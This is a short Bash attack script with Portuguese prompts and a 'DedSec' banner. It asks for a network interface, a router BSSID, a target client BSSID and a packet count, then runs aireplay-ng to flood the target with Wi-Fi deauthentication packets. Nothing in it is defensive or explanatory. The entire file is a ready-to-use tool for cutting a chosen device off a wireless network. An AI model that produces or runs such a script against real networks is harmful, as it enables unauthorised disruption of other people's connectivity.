#!/bin/bash

# Exibe o banner
echo "  _____           _  _____           "
echo " |  __ \         | |/ ____|          "
echo " | |  | | ___  __| | (___   ___  ___ "
echo " | |  | |/ _ \/ _' |\___ \ / _ \/ __|"
echo " | |__| |  __/ (_| |____) |  __/ (__ "
echo " |_____/ \___|\__,_|_____/ \___|\___|"
echo "                                     "
echo "                                     "

# Solicita a entrada do usuário para os parâmetros
read -p "Digite a interface de rede (exemplo: wlan0): " iface
read -p "Digite o BSSID do roteador (exemplo: XX:XX:XX:XX:XX:XX): " bssid_roteador
read -p "Digite o BSSID do alvo (exemplo: XX:XX:XX:XX:XX:XX): " bssid_alvo
read -p "Digite o número de pacotes (padrão: 10000): " packet_number

# Define o número de pacotes padrão como 10000 se não for fornecido
if [ -z "$packet_number" ]; then
    packet_number=10000
fi

# Executa o comando aireplay-ng para realizar o ataque de desautenticação (deauth)
sudo aireplay-ng --deauth "$packet_number" -a "$bssid_roteador" -c "$bssid_alvo" "$iface"

echo "Ataque de desautenticação iniciado com $packet_number pacotes."
